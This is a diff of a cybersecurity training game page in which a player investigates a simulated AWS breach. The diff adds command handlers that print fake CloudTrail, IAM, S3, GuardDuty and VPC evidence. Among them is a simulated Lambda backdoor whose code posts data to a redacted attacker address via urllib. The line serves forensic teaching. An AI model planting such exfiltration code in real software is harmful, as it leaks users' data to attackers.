@@ -2,1639 +2,591 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <script src="../../../components/AccessGuard.js"></script>
+    <script>AccessGuard.require('sorted');</script>
+    <script src="../../../components/AchievementManager.js"></script>
+    <script src="../../../components/ModuleProgress.js"></script>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>FORENSICS-02: Cloud Artifact | Operator</title>
-    <style>
-        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
-        body {
-            background: #0a0c10;
-            color: rgba(255,255,255,0.85);
-            font-family: 'Courier New', monospace;
-            overflow: hidden;
-            height: 100vh;
-            width: 100vw;
-        }
-
-        /* CRT scanlines */
-        body::after {
-            content: '';
-            position: fixed;
-            inset: 0;
-            background: repeating-linear-gradient(
-                0deg,
-                rgba(0,0,0,0.1) 0px,
-                rgba(0,0,0,0.1) 1px,
-                transparent 1px,
-                transparent 3px
-            );
-            pointer-events: none;
-            z-index: 9000;
-        }
-
-        /* ─── Header ─── */
-        .mission-header {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 10px 20px;
-            background: #0e1018;
-            border-bottom: 1px solid rgba(57, 255, 20, 0.15);
-            height: 44px;
-            flex-shrink: 0;
-        }
-        .mission-header-back {
-            font-size: 0.75rem;
-            color: rgba(255,255,255,0.4);
-            text-decoration: none;
-            letter-spacing: 0.08em;
-            transition: color 0.2s;
-        }
-        .mission-header-back:hover { color: #39ff14; }
-        .mission-header-title {
-            font-size: 0.7rem;
-            letter-spacing: 0.15em;
-            color: #39ff14;
-            text-transform: uppercase;
-            font-weight: 600;
-        }
-        .mission-header-status {
-            font-size: 0.6rem;
-            letter-spacing: 0.12em;
-            color: rgba(57, 255, 20, 0.4);
-            text-transform: uppercase;
-        }
-
-        /* ─── Objectives Bar ─── */
-        .obj-bar {
-            display: flex;
-            align-items: center;
-            gap: 16px;
-            padding: 7px 20px;
-            background: #0c0e14;
-            border-bottom: 1px solid rgba(57, 255, 20, 0.1);
-            overflow-x: auto;
-            flex-shrink: 0;
-        }
-        .obj-label {
-            font-size: 0.55rem;
-            letter-spacing: 0.15em;
-            color: rgba(57, 255, 20, 0.3);
-            text-transform: uppercase;
-            white-space: nowrap;
-            margin-right: 4px;
-        }
-        .obj-item {
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            font-size: 0.6rem;
-            color: rgba(255, 255, 255, 0.25);
-            letter-spacing: 0.04em;
-            white-space: nowrap;
-            transition: color 0.3s;
-        }
-        .obj-item.complete { color: #39ff14; }
-        .obj-check {
-            width: 13px;
-            height: 13px;
-            border-radius: 3px;
-            border: 1px solid rgba(57, 255, 20, 0.15);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 0.55rem;
-            flex-shrink: 0;
-            transition: all 0.3s;
-        }
-        .obj-item.complete .obj-check {
-            background: rgba(57, 255, 20, 0.15);
-            border-color: #39ff14;
-            color: #39ff14;
-        }
-
-        /* ─── Split Layout ─── */
-        .mission-layout {
-            display: flex;
-            height: calc(100vh - 44px - 30px);
-        }
-
-        /* ─── Map Panel (left 55%) ─── */
-        .map-panel {
-            flex: 0 0 55%;
-            position: relative;
-            overflow: hidden;
-            border-right: 1px solid rgba(57, 255, 20, 0.1);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: #090b0f;
-        }
-        .map-panel::before {
-            content: '';
-            position: absolute;
-            inset: 0;
-            background-image:
-                linear-gradient(rgba(57, 255, 20, 0.015) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(57, 255, 20, 0.015) 1px, transparent 1px);
-            background-size: 30px 30px;
-            pointer-events: none;
-        }
-
-        /* ─── Grid ─── */
-        .grid-container {
-            display: grid;
-            grid-template-columns: repeat(5, 1fr);
-            grid-template-rows: repeat(4, 1fr);
-            gap: 4px;
-            padding: 20px;
-            width: 100%;
-            height: 100%;
-            max-width: 600px;
-            max-height: 480px;
-        }
-
-        .grid-cell {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            border: 1px solid rgba(57, 255, 20, 0.06);
-            border-radius: 4px;
-            position: relative;
-            transition: all 0.4s ease;
-            min-height: 0;
-            overflow: hidden;
-        }
-
-        /* Cell visibility states */
-        .grid-cell.vis-hidden {
-            background: rgba(57, 255, 20, 0.01);
-            border-color: rgba(57, 255, 20, 0.04);
-        }
-        .grid-cell.vis-revealed {
-            background: rgba(57, 255, 20, 0.05);
-            border-color: rgba(57, 255, 20, 0.15);
-        }
-        .grid-cell.vis-visited {
-            background: rgba(57, 255, 20, 0.09);
-            border-color: rgba(57, 255, 20, 0.25);
-        }
-        .grid-cell.current {
-            background: rgba(57, 255, 20, 0.14);
-            border-color: #39ff14;
-            box-shadow: 0 0 12px rgba(57, 255, 20, 0.15), inset 0 0 8px rgba(57, 255, 20, 0.05);
-        }
-        .grid-cell.wall {
-            background: rgba(255, 255, 255, 0.015);
-            border-color: rgba(255, 255, 255, 0.03);
-        }
-        .grid-cell.empty-vis {
-            background: rgba(57, 255, 20, 0.03);
-        }
-
-        /* Firewall & target accent */
-        .grid-cell[data-type="firewall"]:not(.vis-hidden):not(.wall) {
-            border-left: 2px solid rgba(255, 68, 68, 0.4);
-        }
-        .grid-cell[data-type="firewall"].bypassed:not(.vis-hidden) {
-            border-left-color: rgba(57, 255, 20, 0.4);
-        }
-        .grid-cell[data-type="target"]:not(.vis-hidden):not(.wall) {
-            border-left: 2px solid rgba(255, 215, 0, 0.4);
-        }
-
-        /* Cell content */
-        .cell-icon {
-            font-size: 0.85rem;
-            font-weight: 700;
-            letter-spacing: 0.08em;
-            transition: color 0.3s;
-        }
-        .cell-label {
-            font-size: 0.5rem;
-            letter-spacing: 0.06em;
-            margin-top: 2px;
-            transition: color 0.3s;
-            text-align: center;
-        }
-        .vis-hidden .cell-icon { color: rgba(255, 255, 255, 0.06); }
-        .vis-hidden .cell-label { color: transparent; }
-        .vis-revealed .cell-icon { color: rgba(57, 255, 20, 0.45); }
-        .vis-revealed .cell-label { color: rgba(57, 255, 20, 0.2); }
-        .vis-visited .cell-icon { color: rgba(57, 255, 20, 0.7); }
-        .vis-visited .cell-label { color: rgba(57, 255, 20, 0.35); }
-        .current .cell-icon { color: #39ff14; }
-        .current .cell-label { color: rgba(57, 255, 20, 0.6); }
-        .wall .cell-icon { color: rgba(255, 255, 255, 0.04); }
-        .wall .cell-label { color: transparent; }
-
-        /* Agent dot */
-        .cell-agent {
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-            background: #39ff14;
-            position: absolute;
-            bottom: 5px;
-            right: 5px;
-            animation: agentPulse 2s ease-in-out infinite;
-            box-shadow: 0 0 6px rgba(57, 255, 20, 0.5);
-        }
-        @keyframes agentPulse {
-            0%, 100% { box-shadow: 0 0 4px rgba(57, 255, 20, 0.3); transform: scale(1); }
-            50% { box-shadow: 0 0 12px rgba(57, 255, 20, 0.7), 0 0 20px rgba(57, 255, 20, 0.15); transform: scale(1.15); }
-        }
-
-        /* Cell reveal animation */
-        @keyframes cellReveal {
-            from { opacity: 0; transform: scale(0.9); }
-            to { opacity: 1; transform: scale(1); }
-        }
-        .grid-cell.just-revealed {
-            animation: cellReveal 0.4s ease-out;
-        }
-
-        /* ─── Terminal Panel (right 45%) ─── */
-        .term-panel {
-            flex: 0 0 45%;
-            display: flex;
-            flex-direction: column;
-            height: 100%;
-            background: #080a0e;
-        }
-        .term-bar {
-            padding: 7px 14px;
-            background: #0c0e14;
-            border-bottom: 1px solid rgba(57, 255, 20, 0.1);
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            flex-shrink: 0;
-        }
-        .term-dot {
-            width: 7px;
-            height: 7px;
-            border-radius: 50%;
-            background: rgba(57, 255, 20, 0.3);
-        }
-        .term-bar-label {
-            font-size: 0.55rem;
-            color: rgba(57, 255, 20, 0.35);
-            letter-spacing: 0.1em;
-            margin-left: 6px;
-        }
-        .term-output {
-            flex: 1;
-            overflow-y: auto;
-            padding: 10px 14px;
-            font-size: 0.78rem;
-            line-height: 1.65;
-        }
-        .term-output::-webkit-scrollbar { width: 4px; }
-        .term-output::-webkit-scrollbar-track { background: transparent; }
-        .term-output::-webkit-scrollbar-thumb { background: rgba(57, 255, 20, 0.15); border-radius: 2px; }
-
-        /* Terminal line types */
-        .term-line { word-break: break-word; }
-        .term-system { color: rgba(57, 255, 20, 0.3); }
-        .term-info { color: rgba(57, 255, 20, 0.65); }
-        .term-success { color: #39ff14; font-weight: 600; }
-        .term-error { color: #ff4444; }
-        .term-warning { color: #ffaa00; }
-        .term-node-info { color: #00ccff; }
-        .term-heading { color: #39ff14; font-weight: 700; }
-        .term-prompt-echo { color: rgba(57, 255, 20, 0.45); }
-
-        /* Terminal input */
-        .term-input-row {
-            display: flex;
-            align-items: center;
-            padding: 8px 14px;
-            border-top: 1px solid rgba(57, 255, 20, 0.1);
-            background: #0a0c12;
-            flex-shrink: 0;
-        }
-        .term-prompt-text {
-            color: #39ff14;
-            font-size: 0.78rem;
-            white-space: nowrap;
-            margin-right: 8px;
-        }
-        .term-input {
-            flex: 1;
-            background: transparent;
-            border: none;
-            outline: none;
-            color: #76ff03;
-            font-family: 'Courier New', monospace;
-            font-size: 0.78rem;
-            caret-color: #39ff14;
-        }
-
-        /* ─── Mission Complete Overlay ─── */
-        .mission-complete {
-            position: fixed;
-            inset: 0;
-            background: rgba(0, 0, 0, 0.88);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 8000;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.6s;
-        }
-        .mission-complete.visible {
-            opacity: 1;
-            pointer-events: auto;
-        }
-        .mc-card {
-            background: #0e1018;
-            border: 1px solid rgba(57, 255, 20, 0.3);
-            border-radius: 8px;
-            padding: 36px 40px;
-            text-align: center;
-            max-width: 380px;
-            width: 90%;
-        }
-        .mc-badge {
-            font-size: 0.55rem;
-            letter-spacing: 0.2em;
-            color: rgba(57, 255, 20, 0.5);
-            text-transform: uppercase;
-            margin-bottom: 10px;
-        }
-        .mc-title {
-            font-size: 1.3rem;
-            color: #39ff14;
-            letter-spacing: 0.2em;
-            margin-bottom: 6px;
-            text-shadow: 0 0 20px rgba(57, 255, 20, 0.3);
-        }
-        .mc-subtitle {
-            font-size: 0.7rem;
-            color: rgba(255,255,255,0.35);
-            margin-bottom: 28px;
-        }
-        .mc-stats {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 12px;
-            margin-bottom: 28px;
-        }
-        .mc-stat-value {
-            font-size: 1.5rem;
-            color: #39ff14;
-            font-weight: 700;
-        }
-        .mc-stat-label {
-            font-size: 0.55rem;
-            color: rgba(255,255,255,0.25);
-            letter-spacing: 0.08em;
-            margin-top: 3px;
-            text-transform: uppercase;
-        }
-        .mc-btn {
-            display: inline-block;
-            padding: 10px 28px;
-            background: rgba(57, 255, 20, 0.1);
-            border: 1px solid rgba(57, 255, 20, 0.3);
-            border-radius: 4px;
-            color: #39ff14;
-            font-family: 'Courier New', monospace;
-            font-size: 0.7rem;
-            letter-spacing: 0.12em;
-            text-decoration: none;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-        .mc-btn:hover {
-            background: rgba(57, 255, 20, 0.2);
-            border-color: #39ff14;
-            box-shadow: 0 0 15px rgba(57, 255, 20, 0.15);
-        }
-
-        /* ─── Mobile ─── */
-        @media (max-width: 768px) {
-            .mission-layout {
-                flex-direction: column;
-            }
-            .map-panel {
-                flex: 0 0 42%;
-                border-right: none;
-                border-bottom: 1px solid rgba(57, 255, 20, 0.1);
-            }
-            .term-panel {
-                flex: 1;
-            }
-            .obj-bar { gap: 10px; padding: 6px 12px; }
-            .obj-item { font-size: 0.5rem; }
-            .obj-label { font-size: 0.5rem; }
-            .grid-container { padding: 10px; max-height: none; }
-        }
-        @media (max-width: 480px) {
-            .mission-header { padding: 8px 12px; height: 38px; }
-            .mission-header-title { font-size: 0.6rem; }
-            .mission-layout { height: calc(100vh - 38px - 26px); }
-            .cell-label { display: none; }
-            .cell-icon { font-size: 0.7rem; }
-            .cell-agent { width: 8px; height: 8px; bottom: 3px; right: 3px; }
-            .mc-card { padding: 24px; }
-        }
-    </style>
+    <link rel="stylesheet" href="../engine/operator.css">
 </head>
 <body>
+    <div id="operator-root"></div>
 
-    <!-- Header -->
-    <div class="mission-header">
-        <a href="../index.html" class="mission-header-back">&larr; OPERATOR</a>
-        <div class="mission-header-title">FORENSICS-02 / CLOUD ARTIFACT</div>
-        <div class="mission-header-status" id="header-status">IN PROGRESS</div>
-    </div>
+    <script src="../engine/OperatorEngine.js"></script>
+    <script src="../engine/AgentBridge.js"></script>
+    <script src="../configs/forensics-02.config.js"></script>
+    <script>
+    (function() {
+        var engine = OperatorEngine.init(FORENSICS_02_CONFIG);
+        var agent  = AgentBridge.create(engine);
+        var config = FORENSICS_02_CONFIG;
 
-    <!-- Objectives bar -->
-    <div class="obj-bar">
-        <span class="obj-label">OBJ</span>
-        <div class="obj-item" id="obj-0">
-            <span class="obj-check"></span> Find compromised key
-        </div>
-        <div class="obj-item" id="obj-1">
-            <span class="obj-check"></span> Trace IAM escalation
-        </div>
-        <div class="obj-item" id="obj-2">
-            <span class="obj-check"></span> Determine exfil data
-        </div>
-        <div class="obj-item" id="obj-3">
-            <span class="obj-check"></span> Build incident report
-        </div>
-    </div>
+        // ---- Helpers ----
 
-    <!-- Split layout -->
-    <div class="mission-layout">
-        <!-- Left: Cloud Environment Map -->
-        <div class="map-panel">
-            <div class="grid-container" id="grid-container"></div>
-        </div>
-
-        <!-- Right: Terminal -->
-        <div class="term-panel" id="term-panel">
-            <div class="term-bar">
-                <div class="term-dot"></div>
-                <div class="term-dot"></div>
-                <div class="term-dot"></div>
-                <span class="term-bar-label">OPERATOR TERMINAL</span>
-            </div>
-            <div class="term-output" id="term-output"></div>
-            <div class="term-input-row">
-                <span class="term-prompt-text">investigator@aws:~$</span>
-                <input type="text" class="term-input" id="term-input" autocomplete="off" spellcheck="false" autofocus>
-            </div>
-        </div>
-    </div>
-
-    <!-- Mission Complete Overlay -->
-    <div class="mission-complete" id="mission-complete">
-        <div class="mc-card">
-            <div class="mc-badge">MISSION COMPLETE</div>
-            <div class="mc-title">CLOUD ARTIFACT</div>
-            <div class="mc-subtitle">Breach fully documented. Report filed.</div>
-            <div class="mc-stats">
-                <div>
-                    <div class="mc-stat-value" id="stat-nodes">0</div>
-                    <div class="mc-stat-label">Sources</div>
-                </div>
-                <div>
-                    <div class="mc-stat-value" id="stat-commands">0</div>
-                    <div class="mc-stat-label">Commands</div>
-                </div>
-                <div>
-                    <div class="mc-stat-value" id="stat-time">0s</div>
-                    <div class="mc-stat-label">Time</div>
-                </div>
-            </div>
-            <a href="../index.html" class="mc-btn">RETURN TO OPERATOR</a>
-        </div>
-    </div>
-
-<script>
-/* ═══════════════════════════════════════════════════════════
-   FORENSICS-02: Cloud Artifact — Mission Engine
-   ═══════════════════════════════════════════════════════════ */
-
-// ─── Grid Map ───
-// Rows 0-3, Cols 0-4
-const GRID_MAP = [
-    ['cloudtrail',    'iam-console',     'empty',          'wall',           'wall'],
-    ['empty',         's3-bucket',       'empty',          'lambda-func',    'wall'],
-    ['wall',          'empty',           'vpc-flowlogs',   'empty',          'guardduty'],
-    ['wall',          'secrets-manager', 'empty',          'config-audit',   'empty']
-];
-
-const ROWS = 4;
-const COLS = 5;
-
-// ─── Cell Info ───
-const CELL_INFO = {
-    'cloudtrail':      { label: 'CLOUDTRAIL',   abbr: 'CTR', ip: 'us-east-1', desc: 'AWS CloudTrail — API call audit log',                            ports: ['N/A'],          os: 'AWS Service' },
-    'iam-console':     { label: 'IAM-CONSOLE',  abbr: 'IAM', ip: 'global',    desc: 'Identity and Access Management — users, roles, policies',        ports: ['N/A'],          os: 'AWS Service' },
-    's3-bucket':       { label: 'S3-BUCKET',    abbr: 'S3B', ip: 'us-east-1', desc: 'S3 storage — hexworth-prod-data bucket',                         ports: ['443/HTTPS'],    os: 'AWS Service' },
-    'lambda-func':     { label: 'LAMBDA',       abbr: 'LMB', ip: 'us-east-1', desc: 'Lambda functions — serverless compute',                          ports: ['N/A'],          os: 'AWS Service' },
-    'vpc-flowlogs':    { label: 'VPC-FLOWLOGS', abbr: 'VPC', ip: 'us-east-1', desc: 'VPC Flow Logs — network traffic records',                        ports: ['N/A'],          os: 'AWS Service' },
-    'guardduty':       { label: 'GUARDDUTY',    abbr: 'GDD', ip: 'us-east-1', desc: 'GuardDuty — threat detection findings',                          ports: ['N/A'],          os: 'AWS Service' },
-    'secrets-manager': { label: 'SECRETS-MGR',  abbr: 'SEC', ip: 'us-east-1', desc: 'Secrets Manager — API keys and credentials',                    ports: ['N/A'],          os: 'AWS Service' },
-    'config-audit':    { label: 'CONFIG-AUDIT', abbr: 'CFG', ip: 'us-east-1', desc: 'AWS Config — resource configuration timeline',                   ports: ['N/A'],          os: 'AWS Service' }
-};
-
-// ─── Game State ───
-let STATE = {
-    position: { col: 0, row: 0 },
-    visibility: {},
-    objectives: [false, false, false, false],
-    nodesDiscovered: new Set(),
-    commandCount: 0,
-    commandHistory: [],
-    historyIndex: -1,
-    startTime: Date.now(),
-    completed: false,
-    // Mission-specific fields
-    compromisedKeyFound: false,
-    iamEscalationTraced: false,
-    exfilDataDetermined: false,
-    reportBuilt: false,
-    sourcesExamined: new Set()  // tracks which nodes have been examined
-};
-
-// ─── Objective labels ───
-const OBJ_LABELS = [
-    'COMPROMISED KEY FOUND — breach origin identified',
-    'IAM ESCALATION TRACED — privilege escalation chain mapped',
-    'EXFIL DATA DETERMINED — stolen data scope confirmed',
-    'INCIDENT REPORT BUILT — complete timeline documented'
-];
-
-// ═══ Grid Rendering ═══
-
-function buildGrid() {
-    const container = document.getElementById('grid-container');
-    container.innerHTML = '';
-    for (let r = 0; r < ROWS; r++) {
-        for (let c = 0; c < COLS; c++) {
-            const cell = document.createElement('div');
-            cell.className = 'grid-cell';
-            cell.dataset.col = c;
-            cell.dataset.row = r;
-            cell.dataset.type = GRID_MAP[r][c];
-
-            const icon = document.createElement('div');
-            icon.className = 'cell-icon';
-
-            const label = document.createElement('div');
-            label.className = 'cell-label';
-
-            const agent = document.createElement('div');
-            agent.className = 'cell-agent';
-            agent.style.display = 'none';
-
-            cell.appendChild(icon);
-            cell.appendChild(label);
-            cell.appendChild(agent);
-            container.appendChild(cell);
+        function getCell() {
+            var state = engine.getState();
+            return config.grid.cells[state.position.row][state.position.col];
         }
-    }
-}
 
-function updateGrid() {
-    for (let r = 0; r < ROWS; r++) {
-        for (let c = 0; c < COLS; c++) {
-            const cell = document.querySelector(`.grid-cell[data-col="${c}"][data-row="${r}"]`);
-            if (!cell) continue;
+        // ---- Command handlers ----
 
-            const type = GRID_MAP[r][c];
-            const key = c + ',' + r;
-            const vis = STATE.visibility[key] || 'hidden';
-            const isCurrent = STATE.position.col === c && STATE.position.row === r;
+        function cmdHelp() {
+            engine.printLine('', 'system');
+            engine.printLine('\u2550\u2550\u2550 COMMAND REFERENCE \u2550\u2550\u2550', 'heading');
+            engine.printLine('  scan              Survey area, reveal adjacent services', 'info');
+            engine.printLine('  move <dir>        Move agent (north/south/east/west or n/s/e/w)', 'info');
+            engine.printLine('  examine           Investigate current service in depth', 'info');
+            engine.printLine('  query <filter>    Filter CloudTrail events (key, IP, or service)', 'info');
+            engine.printLine('  diff <resource>   Compare resource versions (policy, code, s3, iam)', 'info');
+            engine.printLine('  download          Download access logs (at S3-BUCKET)', 'info');
+            engine.printLine('  analyze <res>     Deep-dive analysis of a resource', 'info');
+            engine.printLine('  report            Build incident report (requires 5+ sources)', 'info');
+            engine.printLine('  status            Show sources examined and objectives', 'info');
+            engine.printLine('  help              Show this reference', 'info');
+            engine.printLine('  clear             Clear terminal output', 'info');
+            engine.printLine('', 'system');
+            engine.printLine('Start: examine CLOUDTRAIL to see the initial event log.', 'system');
+            engine.printLine('Then explore IAM, S3, LAMBDA, SECRETS-MGR, GUARDDUTY.', 'system');
+            engine.printLine('Build the report once you have 5+ sources examined.', 'system');
+        }
 
-            // Reset classes
-            cell.className = 'grid-cell';
-            cell.dataset.col = c;
-            cell.dataset.row = r;
-            cell.dataset.type = type;
-
-            if (type === 'wall') {
-                cell.classList.add('wall');
-            } else if (isCurrent) {
-                cell.classList.add('current');
+        function cmdScan() {
+            var state = engine.getState();
+            var col = state.position.col, row = state.position.row;
+            var cellType = config.grid.cells[row][col];
+            engine.printLine('Scanning area...', 'system');
+            engine.printLine('', 'system');
+            if (cellType !== 'empty' && cellType !== 'wall') {
+                var cur = config.nodes[cellType];
+                engine.printLine('Current: ' + cur.label + ' (' + cur.ip + ')', 'heading');
+                engine.printLine(cur.desc, 'info');
             } else {
-                cell.classList.add('vis-' + vis);
-                if (type === 'empty' && vis !== 'hidden') cell.classList.add('empty-vis');
+                engine.printLine('Current: No service at this location', 'heading');
+            }
+            engine.printLine('', 'system');
+            engine.printLine('Adjacent:', 'heading');
+            var dirs = [{ name: 'North', dc: 0, dr: -1 }, { name: 'South', dc: 0, dr: 1 }, { name: 'East', dc: 1, dr: 0 }, { name: 'West', dc: -1, dr: 0 }];
+            dirs.forEach(function(d) {
+                var nc = col + d.dc, nr = row + d.dr;
+                if (nc < 0 || nc >= config.grid.cols || nr < 0 || nr >= config.grid.rows) { engine.printLine('  ' + d.name + ': [network edge]', 'system'); return; }
+                var type = config.grid.cells[nr][nc];
+                if (type === 'wall') { engine.printLine('  ' + d.name + ': [blocked]', 'system'); return; }
+                var key = nc + ',' + nr;
+                if (!state.visibility[key] || state.visibility[key] === 'hidden') state.visibility[key] = 'revealed';
+                if (type === 'empty') { engine.printLine('  ' + d.name + ': No service', 'info'); }
+                else { var info = config.nodes[type]; engine.printLine('  ' + d.name + ': ' + info.label + ' (' + info.ip + ')', 'node-info'); }
+            });
+            engine.updateGrid();
+            engine.saveState();
+        }
+
+        function cmdMove(args) {
+            if (!args.length) { engine.printLine('Usage: move <direction>', 'error'); engine.printLine('Directions: north/south/east/west (or n/s/e/w)', 'system'); return; }
+            var dirMap = { 'north': [0,-1], 'n': [0,-1], 'south': [0,1], 's': [0,1], 'east': [1,0], 'e': [1,0], 'west': [-1,0], 'w': [-1,0] };
+            var dir = args[0].toLowerCase();
+            if (!dirMap[dir]) { engine.printLine('Unknown direction: ' + args[0], 'error'); engine.printLine('Use: north/south/east/west (or n/s/e/w)', 'system'); return; }
+            var state = engine.getState();
+            var d = dirMap[dir];
+            var newCol = state.position.col + d[0], newRow = state.position.row + d[1];
+            if (newCol < 0 || newCol >= config.grid.cols || newRow < 0 || newRow >= config.grid.rows) { engine.printLine('Edge of cloud region. Cannot move ' + dir + '.', 'error'); return; }
+            var cellType = config.grid.cells[newRow][newCol];
+            if (cellType === 'wall') { engine.printLine('Blocked. No path ' + dir + ' from here.', 'error'); return; }
+            state.position = { col: newCol, row: newRow };
+            state.visibility[newCol + ',' + newRow] = 'visited';
+            if (cellType !== 'empty') state.nodesDiscovered.add(cellType);
+            engine.revealAdjacent(newCol, newRow);
+            var dirFull = { n: 'north', s: 'south', e: 'east', w: 'west' };
+            var dirName = dirFull[dir] || dir;
+            if (cellType === 'empty') { engine.printLine('Moving ' + dirName + '... No service here.', 'system'); }
+            else { var info = config.nodes[cellType]; engine.printLine('Moving ' + dirName + '... ' + info.label + ' (' + info.ip + ')', 'success'); engine.printLine(info.desc, 'info'); }
+            engine.checkObjectives();
+            engine.updateGrid();
+            engine.saveState();
+        }
+
+        function cmdExamine() {
+            var state = engine.getState();
+            var type = getCell();
+            if (type === 'empty') { engine.printLine('No AWS service at this location. Move to a service node.', 'system'); return; }
+            if (type === 'wall') { engine.printLine('Cannot examine this location.', 'error'); return; }
+
+            engine.printLine('', 'system');
+            if (!state.sourcesExamined) state.sourcesExamined = new Set();
+            state.sourcesExamined.add(type);
+
+            switch (type) {
+                case 'cloudtrail':
+                    engine.printLine('=== CLOUDTRAIL EVENTS ===', 'heading');
+                    engine.printLine('[03/03 01:14] sts:GetCallerIdentity \u2014 AKIAEXAMPLE123 (us-east-1)', 'node-info');
+                    engine.printLine('  Source IP: 91.234.xx.xx (Tor exit node)  \u2190 [SUSPICIOUS]', 'warning');
+                    engine.printLine('[03/03 01:15] iam:CreatePolicyVersion \u2014 AKIAEXAMPLE123', 'node-info');
+                    engine.printLine('  Policy: DataAccessPolicy \u2192 added s3:*, lambda:*  \u2190 [ESCALATION]', 'error');
+                    engine.printLine('[03/03 01:18] s3:GetObject \u2014 hexworth-prod-data/customers/export.csv.gz', 'node-info');
+                    engine.printLine('  Size: 847MB  \u2190 [EXFILTRATION]', 'error');
+                    engine.printLine('[03/03 01:20] lambda:UpdateFunctionCode \u2014 data-processor', 'node-info');
+                    engine.printLine('  Source IP: 91.234.xx.xx  \u2190 [PERSISTENCE]', 'error');
+                    engine.printLine('[03/03 01:22] s3:PutBucketPolicy \u2014 hexworth-prod-data', 'node-info');
+                    engine.printLine('  Effect: Allow s3:GetObject from *  \u2190 [BUCKET OPENED]', 'error');
+                    break;
+
+                case 'iam-console':
+                    engine.printLine('=== IAM INVESTIGATION ===', 'heading');
+                    engine.printLine('User: svc-deploy (service account)', 'node-info');
+                    engine.printLine('Access Key: AKIAEXAMPLE123', 'node-info');
+                    engine.printLine('Created: 2025-06-15', 'info');
+                    engine.printLine('Last rotated: NEVER  \u2190 [VIOLATION]', 'error');
+                    engine.printLine('', 'system');
+                    engine.printLine('Policy versions:', 'heading');
+                    engine.printLine('  v1 (2025-06-15): s3:PutObject on hexworth-deploy/*', 'info');
+                    engine.printLine('  v2 (2026-03-03): s3:*, lambda:*, iam:*  \u2190 [ESCALATED]', 'error');
+                    engine.printLine('', 'system');
+                    engine.printLine('[!] Policy v2 grants full S3, Lambda, and IAM access', 'error');
+                    engine.printLine('Escalation path: CreatePolicyVersion \u2192 SetDefaultPolicyVersion', 'warning');
+                    state.iamEscalationTraced = true;
+                    break;
+
+                case 's3-bucket':
+                    engine.printLine('=== S3 BUCKET: hexworth-prod-data ===', 'heading');
+                    engine.printLine('Objects: 12,847 | Size: 45.2GB', 'node-info');
+                    engine.printLine('Access logging: ENABLED', 'info');
+                    engine.printLine('', 'system');
+                    engine.printLine('Recent access events:', 'heading');
+                    engine.printLine('[03/03 01:18] GetObject: customers/export.csv.gz (847MB)', 'warning');
+                    engine.printLine('  Requester: AKIAEXAMPLE123 from 91.234.xx.xx', 'warning');
+                    engine.printLine('[03/03 01:22] PutBucketPolicy: public read enabled  \u2190 [CRITICAL]', 'error');
+                    engine.printLine('', 'system');
+                    engine.printLine('Exfiltrated data:', 'heading');
+                    engine.printLine('  customers/export.csv.gz \u2014 847MB', 'error');
+                    engine.printLine('  Content: 2.3M customer records (PII: names, emails, SSN)', 'error');
+                    state.exfilDataDetermined = true;
+                    break;
+
+                case 'lambda-func':
+                    engine.printLine('=== LAMBDA: data-processor ===', 'heading');
+                    engine.printLine('Runtime: Python 3.12', 'node-info');
+                    engine.printLine('Last modified: 03/03 01:20 (by AKIAEXAMPLE123)', 'warning');
+                    engine.printLine('', 'system');
+                    engine.printLine('Code diff (original \u2192 modified):', 'heading');
+                    engine.printLine('+ import urllib.request', 'error');
+                    engine.printLine('+ def exfil(data):', 'error');
+                    engine.printLine("+     urllib.request.urlopen('https://91.234.xx.xx/collect',", 'error');
+                    engine.printLine("+         data=json.dumps(data).encode())", 'error');
+                    engine.printLine('', 'system');
+                    engine.printLine('[!] BACKDOOR: Lambda modified to exfiltrate processed data', 'error');
+                    engine.printLine("Trigger: S3 PutObject events on hexworth-prod-data/", 'warning');
+                    break;
+
+                case 'vpc-flowlogs':
+                    engine.printLine('=== VPC FLOW LOGS ===', 'heading');
+                    engine.printLine('[03/03 01:14] 91.234.xx.xx \u2192 10.0.1.50:443 ACCEPT (API Gateway)', 'node-info');
+                    engine.printLine('[03/03 01:18] 10.0.1.50 \u2192 s3.amazonaws.com:443 ACCEPT (847MB)', 'warning');
+                    engine.printLine('[03/03 01:20] 91.234.xx.xx \u2192 lambda.us-east-1:443 ACCEPT', 'warning');
+                    engine.printLine('[03/03 01:25] 10.0.2.100 \u2192 91.234.xx.xx:443 ACCEPT (outbound)  \u2190 [EXFIL]', 'error');
+                    engine.printLine('', 'system');
+                    engine.printLine('Total outbound to 91.234.xx.xx: 847MB over 11 minutes', 'error');
+                    break;
+
+                case 'guardduty':
+                    engine.printLine('=== GUARDDUTY FINDINGS ===', 'heading');
+                    engine.printLine('[HIGH] UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration', 'error');
+                    engine.printLine('  Resource: AKIAEXAMPLE123   Severity: 8.5/10', 'warning');
+                    engine.printLine('[HIGH] Exfiltration:S3/MaliciousIPCaller', 'error');
+                    engine.printLine('  Resource: hexworth-prod-data   Severity: 9.0/10', 'warning');
+                    engine.printLine('[MEDIUM] Persistence:IAMUser/AnomalousBehavior', 'warning');
+                    engine.printLine('  Resource: svc-deploy   Severity: 6.5/10', 'info');
+                    engine.printLine('[HIGH] Impact:S3/PermissionsModification', 'error');
+                    engine.printLine('  Resource: hexworth-prod-data bucket policy   Severity: 8.0/10', 'warning');
+                    break;
+
+                case 'secrets-manager':
+                    engine.printLine('=== SECRETS MANAGER ===', 'heading');
+                    engine.printLine('Secret: svc-deploy-api-key', 'node-info');
+                    engine.printLine('Status: ACTIVE  \u2190 [SHOULD BE ROTATED]', 'error');
+                    engine.printLine('Last accessed: 03/03 01:14', 'warning');
+                    engine.printLine('Version stages: AWSCURRENT (created 2025-06-15)', 'info');
+                    engine.printLine('', 'system');
+                    engine.printLine('[!] This key has been compromised.', 'error');
+                    engine.printLine('Source of breach: Key found in public GitHub repository', 'error');
